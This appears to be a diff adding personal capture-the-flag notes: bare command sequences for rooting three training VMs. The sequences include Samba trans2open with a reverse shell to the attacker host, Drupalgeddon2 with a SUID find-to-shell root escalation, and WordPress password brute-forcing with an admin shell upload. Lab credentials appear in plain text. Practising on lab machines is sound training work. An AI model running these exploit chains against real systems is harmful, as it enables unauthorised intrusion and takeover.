@@ -1,0 +1,65 @@
+KIOPTRIX
+netdiscover -i eth0
+nmap 
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.10.105
+run
+searchsploit samba 2.2
+search trans2open
+use exploit/linux/samba/trans2open
+set payload linux/x86/shell_reverse_tcp
+show options
+set RHOSTS 192.168.10.105
+set LHOST 192.168.10.106
+exploit
+whoami
+cat /var/mail/root
+
+DC
+netdiscover -i eth0
+nmap -Pn -sSV -A -p- -T5 192.168.10.104
+pip install droopescan
+droopescan scan drupal -u http://192.168.10.104/
+searchsploit drupal 7
+msfconsole
+search Drupalgeddon
+use exploit/unix/webapp/drupal_drupalgeddon2
+show options
+set RHOSTS 192.168.10.104
+exploit
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+find /root
+find /root/thefinalflag.txt -exec cat {} \;
+find /root/thefinalflag.txt -exec /bin/sh \;
+
+EVM
+netdiscover -i eth0
+nmap -Pn -sSV -A -T5 192.168.10.103
+dirb 192.168.10.103
+wpscan --update
+wpscan --url http://192.168.10.103/wordpress -e at -e ap -e u 
+cd /usr/share/wordlists
+gunzip rockyou.txt.gz
+wpscan --url http://192.168.10.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
+msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+show options
+set PASSWORD 24992499
+set RHOSTS 192.168.10.103
+set TARGETURI /wordpress
+set USERNAME c0rrupt3d_brain
+exploit
+cd /home
+ls
+cd root3r
+ls
+cat .root_password_ssh.txt
+python -c 'import pty; pty.spawn("/bin/bash")'
+su root
+willy26
+cd
+ls
+cat proof.txt
